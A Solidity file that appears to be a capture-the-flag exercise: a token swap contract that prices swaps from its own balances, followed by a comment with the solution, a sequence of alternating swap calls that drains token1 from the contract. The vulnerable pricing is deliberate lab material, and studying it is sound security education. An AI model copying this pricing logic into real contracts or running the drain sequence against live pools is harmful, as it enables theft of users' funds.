// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/token/ERC20/IERC20.sol";
import "@openzeppelin/token/ERC20/ERC20.sol";
import '@openzeppelin/access/Ownable.sol';

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  // send tokens to contract address
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    // only swap from token1 <> token2
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    // only swap when have on contract balance
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    // Price of swap from one token to the next
    uint swapAmount = getSwapPrice(from, to, amount);
    // transfer swapped amount from sender to address
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    // Approve a specttfic amount to the reciever address
    IERC20(to).approve(address(this), swapAmount);
    // transfer swapped amount from address to sender
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }
  
  // Divide the balance of token 1 by balance of token 2 then multiply by requested amount
  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }
  
  // Approve a specific address to swap a certian amount
  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  // return token balance of input address
  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}

/*

***need to add more gas

contract.address
0xa595c9811aB3d3E623660684E3F26b4324efE7cF

player
0x6507A5F34D98B8345e182EF588AB14A7F4E714AE

Approve contract***
  await contract.approve(contract.address, 500)

Get tokens addresses:
  token1 = await contract.token1()
  0xC6625D405B45ebaA26F9b0aAf29c8D4dBc3A05E6
  token2 = await contract.token2()
  0x4346C99916FB64bA20Cc7Cf997FBC2F13E30293d

We need to swap 2 tokens untill contract token1 balance drain to 0.***
  await contract.swap(token1, token2, 10)
  await contract.swap(token2, token1, 20)
  await contract.swap(token1, token2, 24)
  await contract.swap(token2, token1, 30)
  await contract.swap(token1, token2, 41)
  await contract.swap(token2, token1, 45)

Check token1 balance. It will be 0.
  await contract.balanceOf(token1, instance).then(v => v.toString())
  
*/